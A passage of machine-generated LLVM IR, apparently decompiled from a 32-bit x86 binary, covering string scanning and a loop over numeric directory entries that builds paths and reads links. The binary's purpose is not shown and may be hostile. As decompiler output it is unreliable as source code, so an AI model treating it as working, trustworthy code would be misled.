  %v5_804cb62 = phi i32 [ %v7_804cb62, %dec_label_pc_804cb6a ], [ %v1_804cb5f, %dec_label_pc_804cb5f ]
  %v0_804cb65 = phi i32 [ %v1_804cb65, %dec_label_pc_804cb6a ], [ %v2_804cb5f, %dec_label_pc_804cb5f ]
  %v1_804cb62 = add i32 %v0_804cb65, 3
  %v2_804cb62 = inttoptr i32 %v1_804cb62 to i8*
  %v3_804cb62 = load i8, i8* %v2_804cb62, align 1
  %v4_804cb62 = zext i8 %v3_804cb62 to i32
  %v6_804cb62 = and i32 %v5_804cb62, -256
  %v7_804cb62 = or i32 %v4_804cb62, %v6_804cb62
  store i32 %v7_804cb62, i32* %edx.global-to-local, align 4
  %v1_804cb65 = add i32 %v0_804cb65, 1
  store i32 %v1_804cb65, i32* %eax.global-to-local, align 4
  %v4_804cb66 = icmp eq i8 %v3_804cb62, 0
  br i1 %v4_804cb66, label %dec_label_pc_804cb6f, label %dec_label_pc_804cb6a

dec_label_pc_804cb6a:                             ; preds = %dec_label_pc_804cb62
  %v7_804cb6a = icmp eq i8 %v3_804cb62, 32
  %v1_804cb6d = icmp eq i1 %v7_804cb6a, false
  br i1 %v1_804cb6d, label %dec_label_pc_804cb62, label %dec_label_pc_804cb6f

dec_label_pc_804cb6f:                             ; preds = %dec_label_pc_804cb6a, %dec_label_pc_804cb62
  %v2_804cb6f = sub i32 %v1_804cb65, %v0_804cb5f
  store i32 %v2_804cb6f, i32* %eax.global-to-local, align 4
  %v1_804cb71 = add i32 %v2_804cb6f, 2
  br label %dec_label_pc_804cb74

dec_label_pc_804cb74:                             ; preds = %dec_label_pc_804cb45, %dec_label_pc_804cb57, %dec_label_pc_804cb6f
  %storemerge = phi i32 [ %v1_804cb71, %dec_label_pc_804cb6f ], [ %v1_804cb45, %dec_label_pc_804cb57 ], [ %v1_804cb45, %dec_label_pc_804cb45 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804cb74 = add i32 %v2_804cb74, %storemerge
  %v4_804cb74 = inttoptr i32 %v3_804cb74 to i8*
  store i8 0, i8* %v4_804cb74, align 1
  %v0_804cb7f = load i32, i32* @edi, align 4
  %v1_804cb7f = load i32, i32* @ecx, align 4
  %v2_804cb7f = add i32 %v1_804cb7f, %v0_804cb7f
  store i32 %v2_804cb7f, i32* @ebx, align 4
  %v5_804cb82 = inttoptr i32 %v2_804cb7f to i8*
  store i8* %v5_804cb82, i8** %stack_var_-8796, align 4
  %v3_804cb83 = call i32 @function_804f5b0(i8* %v5_804cb82)
  store i32 %v3_804cb83, i32* %eax.global-to-local, align 4
  store i32 %v2_804ca9a, i32* @edx, align 4
  %v0_804cb94 = load i32, i32* @ebx, align 4
  %v5_804cb94 = inttoptr i32 %v0_804cb94 to i8*
  store i8* %v5_804cb94, i8** %stack_var_-8796, align 4
  %v5_804cb95 = call i32 @function_804f8a0(i8* %v5_804cb94, i32 %v3_804cb83, i32 %v2_804ca9a)
  %v1_804cb9d = add i32 %v5_804cb95, 1
  %v8_804cb9d = icmp eq i32 %v1_804cb9d, 0
  store i32 %v1_804cb9d, i32* @eax, align 4
  br i1 %v8_804cb9d, label %dec_label_pc_804cb04.backedge, label %dec_label_pc_804cba4

dec_label_pc_804cba4:                             ; preds = %dec_label_pc_804cb74
  %v0_804cba4 = load i32, i32* @esi, align 4
  %v1_804cba4 = add i32 %v0_804cba4, 1
  %v0_804cba7 = load i32, i32* @edi, align 4
  %v2_804cba7 = add i32 %v0_804cba7, %v0_804cba4
  store i32 %v2_804cba7, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804cbb3.outer

dec_label_pc_804cbb3.outer:                       ; preds = %dec_label_pc_804cf32, %dec_label_pc_804cba4
  %v0_804cf2830 = phi i32 [ %v1_804cf28, %dec_label_pc_804cf32 ], [ 0, %dec_label_pc_804cba4 ]
  %v0_804cbb625 = phi i32 [ %v1_804cbb6, %dec_label_pc_804cf32 ], [ %v1_804cba4, %dec_label_pc_804cba4 ]
  %v5_804cbb324 = phi i32 [ %v7_804cbb3, %dec_label_pc_804cf32 ], [ %v1_804cb9d, %dec_label_pc_804cba4 ]
  %v0_804cbb322 = phi i32 [ %v1_804cf38, %dec_label_pc_804cf32 ], [ %v2_804cba7, %dec_label_pc_804cba4 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804cf32 ], [ 0, %dec_label_pc_804cba4 ]
  br label %dec_label_pc_804cbb3

dec_label_pc_804cbb3:                             ; preds = %dec_label_pc_804cbb3.outer, %dec_label_pc_804cbd5
  %v0_804cf28 = phi i32 [ %v0_804cf2830, %dec_label_pc_804cbb3.outer ], [ %v0_804cbd6, %dec_label_pc_804cbd5 ]
  %v0_804cf40 = phi i32 [ 0, %dec_label_pc_804cbb3.outer ], [ %storemerge4, %dec_label_pc_804cbd5 ]
  %v0_804cbb6 = phi i32 [ %v0_804cbb625, %dec_label_pc_804cbb3.outer ], [ %v1_804cbb6, %dec_label_pc_804cbd5 ]
  %v5_804cbb3 = phi i32 [ %v5_804cbb324, %dec_label_pc_804cbb3.outer ], [ %v7_804cbb3, %dec_label_pc_804cbd5 ]
  %v0_804cbd5 = phi i32 [ %v0_804cbb322, %dec_label_pc_804cbb3.outer ], [ %v1_804cbd5, %dec_label_pc_804cbd5 ]
  %v1_804cbb3 = add i32 %v0_804cbd5, 2
  %v2_804cbb3 = inttoptr i32 %v1_804cbb3 to i8*
  %v3_804cbb3 = load i8, i8* %v2_804cbb3, align 1
  %v4_804cbb3 = zext i8 %v3_804cbb3 to i32
  %v6_804cbb3 = and i32 %v5_804cbb3, -256
  %v7_804cbb3 = or i32 %v4_804cbb3, %v6_804cbb3
  store i32 %v7_804cbb3, i32* @eax, align 4
  %v1_804cbb6 = add i32 %v0_804cbb6, 1
  %v4_804cbb7 = icmp eq i8 %v3_804cbb3, 0
  br i1 %v4_804cbb7, label %dec_label_pc_804cbdb, label %dec_label_pc_804cbbb

dec_label_pc_804cbbb:                             ; preds = %dec_label_pc_804cbb3
  %v7_804cbbb = icmp eq i8 %v3_804cbb3, 32
  br i1 %v7_804cbbb, label %dec_label_pc_804cf40, label %dec_label_pc_804cbc3

dec_label_pc_804cbc3:                             ; preds = %dec_label_pc_804cbbb
  %v10_804cbc3 = icmp eq i8 %v3_804cbb3, 9
  br i1 %v10_804cbc3, label %dec_label_pc_804cf40, label %dec_label_pc_804cbcb

dec_label_pc_804cbcb:                             ; preds = %dec_label_pc_804cbc3
  %v1_804cbcb = trunc i32 %v0_804cf40 to i8
  %v9_804cbcb = icmp eq i8 %v1_804cbcb, 1
  br i1 %v9_804cbcb, label %dec_label_pc_804cf28, label %dec_label_pc_804cbd3

dec_label_pc_804cbd3:                             ; preds = %dec_label_pc_804cf28, %dec_label_pc_804cbcb
  %v0_804cbd631 = phi i32 [ %v1_804cf28, %dec_label_pc_804cf28 ], [ %v0_804cf28, %dec_label_pc_804cbcb ]
  br label %dec_label_pc_804cbd5

dec_label_pc_804cbd5:                             ; preds = %dec_label_pc_804cf40, %dec_label_pc_804cbd3
  %v0_804cbd6 = phi i32 [ %v0_804cbd631, %dec_label_pc_804cbd3 ], [ %v0_804cf28, %dec_label_pc_804cf40 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804cbd3 ], [ %v2_804cf40, %dec_label_pc_804cf40 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804cbd5 = add i32 %v0_804cbd5, 1
  store i32 %v1_804cbd5, i32* %edx.global-to-local, align 4
  %v7_804cbd9 = icmp sgt i32 %v0_804cbd6, 6
  br i1 %v7_804cbd9, label %dec_label_pc_804cbdb, label %dec_label_pc_804cbb3

dec_label_pc_804cbdb:                             ; preds = %dec_label_pc_804cbd5, %dec_label_pc_804cbb3
  %v5_804cbfa35 = phi i32 [ %storemerge4, %dec_label_pc_804cbd5 ], [ %v0_804cf40, %dec_label_pc_804cbb3 ]
  store i32 %v1_804cbb6, i32* %edx.global-to-local, align 4
  %v4_804cbdd = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804cbdd, label %dec_label_pc_804cb04.outer.backedge, label %dec_label_pc_804cbe8

dec_label_pc_804cb04.outer.backedge:              ; preds = %dec_label_pc_804cbdb, %dec_label_pc_804cc08
  %v0_804cb048.be = phi i32 [ %v3_804cc17, %dec_label_pc_804cc08 ], [ %v7_804cbb3, %dec_label_pc_804cbdb ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804cc08 ], [ 0, %dec_label_pc_804cbdb ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804cb0c90 = call i32 @function_804f7d0(i32 %v2_804ca1a, i32 512, i32 %v0_804cb048.be)
  store i32 %v4_804cb0c90, i32* %eax.global-to-local, align 4
  %v1_804cb1491 = icmp eq i32 %v4_804cb0c90, 0
  br i1 %v1_804cb1491, label %dec_label_pc_804cc3b.loopexit, label %dec_label_pc_804cb1c.lr.ph

dec_label_pc_804cb1c.lr.ph:                       ; preds = %dec_label_pc_804cb1c.lr.ph.lr.ph, %dec_label_pc_804cb04.outer.backedge
  %v4_804cb0c9098 = phi i32 [ %v4_804cb0c9095, %dec_label_pc_804cb1c.lr.ph.lr.ph ], [ %v4_804cb0c90, %dec_label_pc_804cb04.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804cb1c.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804cb04.outer.backedge ]
  br label %dec_label_pc_804cb1c

dec_label_pc_804cbe8:                             ; preds = %dec_label_pc_804cbdb
  %v3_804cbe8 = add i32 %v1_804cbb6, %v2_804cb74
  %v4_804cbe8 = inttoptr i32 %v3_804cbe8 to i8*
  %v5_804cbe8 = load i8, i8* %v4_804cbe8, align 1
  %v6_804cbe8 = zext i8 %v5_804cbe8 to i32
  %v9_804cbe8 = or i32 %v6_804cbe8, %v6_804cbb3
  store i32 %v9_804cbe8, i32* %eax.global-to-local, align 4
  %v4_804cbef = icmp eq i8 %v5_804cbe8, 0
  br i1 %v4_804cbef, label %dec_label_pc_804cc08, label %dec_label_pc_804cbf3

dec_label_pc_804cbf3:                             ; preds = %dec_label_pc_804cbe8
  %v7_804cbf3 = icmp eq i8 %v5_804cbe8, 32
  br i1 %v7_804cbf3, label %dec_label_pc_804cc08, label %dec_label_pc_804cbf7

dec_label_pc_804cbf7:                             ; preds = %dec_label_pc_804cbf3
  %v2_804cbf7 = add i32 %v1_804cbb6, %v0_804cba7
  store i32 %v2_804cbf7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbfa

dec_label_pc_804cbfa:                             ; preds = %dec_label_pc_804cc03, %dec_label_pc_804cbf7
  %v0_804cbfd = phi i32 [ %v1_804cbfd, %dec_label_pc_804cc03 ], [ %v1_804cbb6, %dec_label_pc_804cbf7 ]
  %v5_804cbfa = phi i32 [ %v7_804cbfa, %dec_label_pc_804cc03 ], [ %v5_804cbfa35, %dec_label_pc_804cbf7 ]
  %v0_804cbfe = phi i32 [ %v1_804cbfa, %dec_label_pc_804cc03 ], [ %v2_804cbf7, %dec_label_pc_804cbf7 ]
  %v1_804cbfa = add i32 %v0_804cbfe, 1
  %v2_804cbfa = inttoptr i32 %v1_804cbfa to i8*
  %v3_804cbfa = load i8, i8* %v2_804cbfa, align 1
  %v1_804cbfd = add i32 %v0_804cbfd, 1
  store i32 %v1_804cbfa, i32* %eax.global-to-local, align 4
  %v4_804cbff = icmp eq i8 %v3_804cbfa, 0
  br i1 %v4_804cbff, label %dec_label_pc_804cc08, label %dec_label_pc_804cc03

dec_label_pc_804cc03:                             ; preds = %dec_label_pc_804cbfa
  %v4_804cbfa = zext i8 %v3_804cbfa to i32
  %v6_804cbfa = and i32 %v5_804cbfa, -256
  %v7_804cbfa = or i32 %v4_804cbfa, %v6_804cbfa
  %v7_804cc03 = icmp eq i8 %v3_804cbfa, 32
  %v1_804cc06 = icmp eq i1 %v7_804cc03, false
  br i1 %v1_804cc06, label %dec_label_pc_804cbfa, label %dec_label_pc_804cc08

dec_label_pc_804cc08:                             ; preds = %dec_label_pc_804cc03, %dec_label_pc_804cbfa, %dec_label_pc_804cbf3, %dec_label_pc_804cbe8
  %v1_804cc08 = phi i32 [ %v1_804cbb6, %dec_label_pc_804cbf3 ], [ %v1_804cbb6, %dec_label_pc_804cbe8 ], [ %v1_804cbfd, %dec_label_pc_804cbfa ], [ %v1_804cbfd, %dec_label_pc_804cc03 ]
  %v3_804cc08 = add i32 %v1_804cc08, %v2_804cb74
  %v4_804cc08 = inttoptr i32 %v3_804cc08 to i8*
  store i8 0, i8* %v4_804cc08, align 1
  %v0_804cc13 = load i32, i32* @edi, align 4
  %v1_804cc13 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cc13 = add i32 %v1_804cc13, %v0_804cc13
  store i32 %v2_804cc13, i32* @ebx, align 4
  %v5_804cc16 = inttoptr i32 %v2_804cc13 to i8*
  store i8* %v5_804cc16, i8** %stack_var_-8796, align 4
  %v3_804cc17 = call i32 @function_804f5b0(i8* %v5_804cc16)
  store i32 %v3_804cc17, i32* @eax, align 4
  %v1_804cc1f = add i32 %v3_804cc17, -15
  %v6_804cc1f = sub i32 14, %v3_804cc17
  %v7_804cc1f = and i32 %v6_804cc1f, %v3_804cc17
  %v8_804cc1f = icmp slt i32 %v7_804cc1f, 0
  %v9_804cc1f = icmp eq i32 %v1_804cc1f, 0
  %v10_804cc1f = icmp slt i32 %v1_804cc1f, 0
  %v3_804cc22 = icmp eq i1 %v10_804cc1f, %v8_804cc1f
  %v4_804cc22 = icmp eq i1 %v9_804cc1f, false
  %v5_804cc22 = and i1 %v4_804cc22, %v3_804cc22
  br i1 %v5_804cc22, label %dec_label_pc_804cb04.outer.backedge, label %dec_label_pc_804cc28

dec_label_pc_804cc28:                             ; preds = %dec_label_pc_804cc08
  %v0_804cc2a = load i32, i32* @ebx, align 4
  %v2_804cc2b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cc2b, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804cc33 = call i32 @function_804f5d0(i8* %tmp73, i32 %v0_804cc2a)
  store i32 %v4_804cc33, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc3b

dec_label_pc_804cc3b.loopexit:                    ; preds = %dec_label_pc_804cb04.backedge, %dec_label_pc_804cb04.outer.preheader, %dec_label_pc_804cb04.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804cb04.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804cb04.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804cb04.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804cc3b

dec_label_pc_804cc3b:                             ; preds = %dec_label_pc_804cc3b.loopexit, %dec_label_pc_804cc28
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804cc3b.loopexit ], [ %tmp73, %dec_label_pc_804cc28 ]
  %v2_804cc45.pre-phi = phi i32 [ %.pre, %dec_label_pc_804cc3b.loopexit ], [ %v2_804cc2b, %dec_label_pc_804cc28 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804cc3b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804cc28 ]
  %v0_804cc3e = load i32, i32* @ebp, align 4
  %v5_804cc3e = inttoptr i32 %v0_804cc3e to i8*
  store i8* %v5_804cc3e, i8** %stack_var_-8796, align 4
  %v2_804cc3f = call i32 @function_804fb51(i32 %v0_804cc3e)
  %v2_804cc44 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804cc44 = ptrtoint i8* %v2_804cc44 to i32
  store i32 %v3_804cc44, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc45.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804cc4d = call i32 @function_804f5b0(i8* %.pre-phi)
  store i32 %v3_804cc4d, i32* %eax.global-to-local, align 4
  %v1_804cc55 = icmp eq i32 %v3_804cc4d, 0
  br i1 %v1_804cc55, label %dec_label_pc_804cf57, label %dec_label_pc_804cc5d

dec_label_pc_804cc5d:                             ; preds = %dec_label_pc_804cc3b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804cc63 = call i32 @function_804ebb0(i32 6, i32* null)
  store i32 %v4_804cc63, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804cc6a = inttoptr i32 %v4_804cc63 to i8*
  store i8* %v4_804cc6a, i8** %stack_var_-8796, align 4
  %v2_804cc6d = call i32 @function_804ff14(i32 %v4_804cc63)
  store i32 %v2_804cc6d, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc6d, i32* %stack_var_-8780, align 4
  %v1_804cc79 = icmp eq i32 %v2_804cc6d, 0
  br i1 %v1_804cc79, label %dec_label_pc_804cfa7, label %dec_label_pc_804cc89

dec_label_pc_804cc89:                             ; preds = %dec_label_pc_804cd48, %dec_label_pc_804ccba, %dec_label_pc_804ccad, %dec_label_pc_804d01e, %dec_label_pc_804cc5d
  %v0_804cc89 = phi i32 [ %v15_804ca14, %dec_label_pc_804cc5d ], [ %v1_804d027, %dec_label_pc_804d01e ], [ %v1_804cc96, %dec_label_pc_804ccad ], [ %v1_804cd3e, %dec_label_pc_804ccba ], [ %v1_804cdc0, %dec_label_pc_804cd48 ]
  %v2_804cc8c = inttoptr i32 %v0_804cc89 to i32*
  %v3_804cc8c = load i32, i32* %v2_804cc8c, align 4
  store i32 %v3_804cc8c, i32* @ebx, align 4
  %v2_804cc90 = add i32 %v0_804cc89, -16
  %v3_804cc90 = inttoptr i32 %v2_804cc90 to i32*
  store i32 %v3_804cc8c, i32* %v3_804cc90, align 4
  %v0_804cc91 = call i32 @function_8050005()
  store i32 %v0_804cc91, i32* @eax, align 4
  %v0_804cc96 = load i32, i32* @esp, align 4
  %v1_804cc96 = add i32 %v0_804cc96, 16
  %v1_804cc99 = icmp eq i32 %v0_804cc91, 0
  br i1 %v1_804cc99, label %dec_label_pc_804cf92, label %dec_label_pc_804cca1

dec_label_pc_804cca1:                             ; preds = %dec_label_pc_804cc89
  %v1_804cca1 = add i32 %v0_804cc96, 20
  %v2_804cca1 = inttoptr i32 %v1_804cca1 to i32*
  %v3_804cca1 = load i32, i32* %v2_804cca1, align 4
  %v1_804cca5 = icmp eq i32 %v3_804cca1, 0
  %v1_804cca7 = icmp eq i1 %v1_804cca5, false
  br i1 %v1_804cca7, label %dec_label_pc_804cf92, label %dec_label_pc_804ccad

dec_label_pc_804ccad:                             ; preds = %dec_label_pc_804cca1
  %v1_804ccad = add i32 %v0_804cc91, 11
  store i32 %v1_804ccad, i32* @edi, align 4
  %v2_804ccb0 = inttoptr i32 %v1_804ccad to i8*
  %v3_804ccb0 = load i8, i8* %v2_804ccb0, align 1
  %v4_804ccb0 = zext i8 %v3_804ccb0 to i32
  %v6_804ccb0 = and i32 %v0_804cc91, -256
  %v7_804ccb0 = or i32 %v4_804ccb0, %v6_804ccb0
  %v1_804ccb3 = add i32 %v7_804ccb0, -48
  %v8_804ccb3 = trunc i32 %v1_804ccb3 to i8
  store i32 %v1_804ccb3, i32* %eax.global-to-local, align 4
  %v8_804ccb8 = icmp ugt i8 %v8_804ccb3, 9
  br i1 %v8_804ccb8, label %dec_label_pc_804cc89, label %dec_label_pc_804ccba

dec_label_pc_804ccba:                             ; preds = %dec_label_pc_804ccad
  %v2_804ccba = add i32 %v0_804cc96, 12
  %v3_804ccba = inttoptr i32 %v2_804ccba to i32*
  store i32 %v1_804ccb3, i32* %v3_804ccba, align 4
  %v0_804ccbb = load i32, i32* %eax.global-to-local, align 4
  %v2_804ccbb = add i32 %v0_804cc96, 8
  %v3_804ccbb = inttoptr i32 %v2_804ccbb to i32*
  store i32 %v0_804ccbb, i32* %v3_804ccbb, align 4
  %v1_804ccbc = add i32 %v0_804cc96, 4
  %v2_804ccbc = inttoptr i32 %v1_804ccbc to i32*
  store i32 0, i32* %v2_804ccbc, align 4
  %v2_804ccbe = inttoptr i32 %v0_804cc96 to i32*
  store i32 6, i32* %v2_804ccbe, align 4
  %v3_804ccc0 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804ccc0, i32* %eax.global-to-local, align 4
  %v0_804ccc5 = load i32, i32* @esp, align 4
  %v1_804ccc5 = inttoptr i32 %v0_804ccc5 to i32*
  %v3_804ccc5 = add i32 %v0_804ccc5, 4
  %v1_804ccc6 = inttoptr i32 %v3_804ccc5 to i32*
  store i32 %v3_804ccc0, i32* %v1_804ccc6, align 4
  %v1_804ccc8 = add i32 %v0_804ccc5, 4139
  store i32 %v1_804ccc8, i32* %eax.global-to-local, align 4
  store i32 %v1_804ccc8, i32* %v1_804ccc5, align 4
  %v3_804ccd0 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ccd0, i32* %eax.global-to-local, align 4
  %v0_804ccd5 = load i32, i32* @esp, align 4
  %v1_804ccd5 = inttoptr i32 %v0_804ccd5 to i32*
  %v2_804ccd5 = load i32, i32* %v1_804ccd5, align 4
  store i32 %v2_804ccd5, i32* @ebx, align 4
  %v1_804ccd6 = add i32 %v0_804ccd5, 4139
  store i32 %v1_804ccd6, i32* %edx.global-to-local, align 4
  store i32 %v1_804ccd6, i32* %v1_804ccd5, align 4
  %v2_804ccde = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804ccde, i32* %eax.global-to-local, align 4
  %v0_804cce3 = load i32, i32* @esp, align 4
  %v1_804cce3 = inttoptr i32 %v0_804cce3 to i32*
  %v2_804cce3 = load i32, i32* %v1_804cce3, align 4
  store i32 %v2_804cce3, i32* %edx.global-to-local, align 4
  %v3_804cce3 = add i32 %v0_804cce3, 4
  %v1_804cce4 = inttoptr i32 %v3_804cce3 to i32*
  %v0_804cce5 = load i32, i32* @edi, align 4
  store i32 %v0_804cce5, i32* %v1_804cce4, align 4
  %v1_804cce6 = add i32 %v0_804cce3, 4139
  store i32 %v1_804cce6, i32* %edx.global-to-local, align 4
  %v2_804cced = add i32 %v1_804cce6, %v2_804ccde
  store i32 %v2_804cced, i32* %eax.global-to-local, align 4
  store i32 %v2_804cced, i32* %v1_804cce3, align 4
  %v3_804ccf1 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ccf1, i32* %eax.global-to-local, align 4
  %v0_804ccf6 = load i32, i32* @esp, align 4
  %v1_804ccf6 = inttoptr i32 %v0_804ccf6 to i32*
  %v2_804ccf6 = load i32, i32* %v1_804ccf6, align 4
  store i32 %v2_804ccf6, i32* @ebp, align 4
  %v3_804ccf6 = add i32 %v0_804ccf6, 4
  %v1_804ccf7 = inttoptr i32 %v3_804ccf6 to i32*
  %v2_804ccf7 = load i32, i32* %v1_804ccf7, align 4
  store i32 %v2_804ccf7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804ccf7, align 4
  store i32 7, i32* %v1_804ccf6, align 4
  %v3_804ccfc = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804ccfc, i32* %eax.global-to-local, align 4
  %v0_804cd01 = load i32, i32* @esp, align 4
  %v1_804cd01 = inttoptr i32 %v0_804cd01 to i32*
  %v2_804cd01 = load i32, i32* %v1_804cd01, align 4
  store i32 %v2_804cd01, i32* @esi, align 4
  store i32 %v3_804ccfc, i32* @ebx, align 4
  %v1_804cd04 = add i32 %v0_804cd01, 4139
  store i32 %v1_804cd04, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd04, i32* %v1_804cd01, align 4
  %v2_804cd0c = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804cd0c, i32* %eax.global-to-local, align 4
  %v0_804cd11 = load i32, i32* @esp, align 4
  %v1_804cd11 = inttoptr i32 %v0_804cd11 to i32*
  %v2_804cd11 = load i32, i32* %v1_804cd11, align 4
  store i32 %v2_804cd11, i32* %edx.global-to-local, align 4
  %v3_804cd11 = add i32 %v0_804cd11, 4
  %v1_804cd12 = inttoptr i32 %v3_804cd11 to i32*
  %v0_804cd13 = load i32, i32* @ebx, align 4
  store i32 %v0_804cd13, i32* %v1_804cd12, align 4
  %v1_804cd14 = add i32 %v0_804cd11, 4139
  store i32 %v1_804cd14, i32* %edx.global-to-local, align 4
  %v2_804cd1b = add i32 %v1_804cd14, %v2_804cd0c
  store i32 %v2_804cd1b, i32* %eax.global-to-local, align 4
  store i32 %v2_804cd1b, i32* %v1_804cd11, align 4
  %v3_804cd1f = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804cd24 = load i32, i32* @esp, align 4
  %v1_804cd27 = add i32 %v0_804cd24, 8
  %v2_804cd27 = inttoptr i32 %v1_804cd27 to i32*
  store i32 4096, i32* %v2_804cd27, align 4
  %v1_804cd2c = add i32 %v0_804cd24, 43
  store i32 %v1_804cd2c, i32* %eax.global-to-local, align 4
  %v2_804cd30 = add i32 %v0_804cd24, 4
  %v3_804cd30 = inttoptr i32 %v2_804cd30 to i32*
  store i32 %v1_804cd2c, i32* %v3_804cd30, align 4
  %v1_804cd31 = add i32 %v0_804cd24, 4139
  store i32 %v1_804cd31, i32* %edx.global-to-local, align 4
  %v3_804cd38 = inttoptr i32 %v0_804cd24 to i32*
  store i32 %v1_804cd31, i32* %v3_804cd38, align 4
  %v4_804cd39 = call i32 @function_804fd22(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804cd3e = load i32, i32* @esp, align 4
  %v1_804cd3e = add i32 %v0_804cd3e, 16
  %v1_804cd41 = add i32 %v4_804cd39, 1
  %v8_804cd41 = icmp eq i32 %v1_804cd41, 0
  store i32 %v1_804cd41, i32* %eax.global-to-local, align 4
  br i1 %v8_804cd41, label %dec_label_pc_804cc89, label %dec_label_pc_804cd48

dec_label_pc_804cd48:                             ; preds = %dec_label_pc_804ccba
  %v2_804cd48 = add i32 %v0_804cd3e, 12
  %v3_804cd48 = inttoptr i32 %v2_804cd48 to i32*
  store i32 %v1_804cd41, i32* %v3_804cd48, align 4
  %v0_804cd49 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd49 = add i32 %v0_804cd3e, 8
  %v3_804cd49 = inttoptr i32 %v2_804cd49 to i32*
  store i32 %v0_804cd49, i32* %v3_804cd49, align 4
  %v1_804cd4a = add i32 %v0_804cd3e, 4
  %v2_804cd4a = inttoptr i32 %v1_804cd4a to i32*
  store i32 0, i32* %v2_804cd4a, align 4
  %v2_804cd4c = inttoptr i32 %v0_804cd3e to i32*
  store i32 6, i32* %v2_804cd4c, align 4
  %v3_804cd4e = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804cd4e, i32* %eax.global-to-local, align 4
  %v0_804cd53 = load i32, i32* @esp, align 4
  %v1_804cd53 = inttoptr i32 %v0_804cd53 to i32*
  %v3_804cd53 = add i32 %v0_804cd53, 4
  %v1_804cd54 = inttoptr i32 %v3_804cd53 to i32*
  store i32 %v3_804cd4e, i32* %v1_804cd54, align 4
  %v1_804cd56 = add i32 %v0_804cd53, 4139
  store i32 %v1_804cd56, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd56, i32* %v1_804cd53, align 4
  %v3_804cd5e = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804cd5e, i32* %eax.global-to-local, align 4
  %v0_804cd63 = load i32, i32* @esp, align 4
  %v1_804cd63 = inttoptr i32 %v0_804cd63 to i32*
  %v2_804cd63 = load i32, i32* %v1_804cd63, align 4
  store i32 %v2_804cd63, i32* @ebx, align 4
  %v1_804cd64 = add i32 %v0_804cd63, 4139
  store i32 %v1_804cd64, i32* %edx.global-to-local, align 4
  store i32 %v1_804cd64, i32* %v1_804cd63, align 4
  %v2_804cd6c = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804cd6c, i32* %eax.global-to-local, align 4
  %v0_804cd71 = load i32, i32* @esp, align 4
  %v1_804cd71 = inttoptr i32 %v0_804cd71 to i32*
  %v2_804cd71 = load i32, i32* %v1_804cd71, align 4
  store i32 %v2_804cd71, i32* %edx.global-to-local, align 4
  %v3_804cd71 = add i32 %v0_804cd71, 4
  %v1_804cd72 = inttoptr i32 %v3_804cd71 to i32*
  %v0_804cd73 = load i32, i32* @edi, align 4
  store i32 %v0_804cd73, i32* %v1_804cd72, align 4
  %v1_804cd74 = add i32 %v0_804cd71, 4139
  store i32 %v1_804cd74, i32* %edx.global-to-local, align 4
  %v2_804cd7b = add i32 %v1_804cd74, %v2_804cd6c
  store i32 %v2_804cd7b, i32* %eax.global-to-local, align 4
  store i32 %v2_804cd7b, i32* %v1_804cd71, align 4
  %v3_804cd7f = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804cd7f, i32* %eax.global-to-local, align 4
  %v0_804cd84 = load i32, i32* @esp, align 4
  %v1_804cd84 = inttoptr i32 %v0_804cd84 to i32*
  %v2_804cd84 = load i32, i32* %v1_804cd84, align 4
  store i32 %v2_804cd84, i32* @ebp, align 4
  %v3_804cd84 = add i32 %v0_804cd84, 4
  %v1_804cd85 = inttoptr i32 %v3_804cd84 to i32*
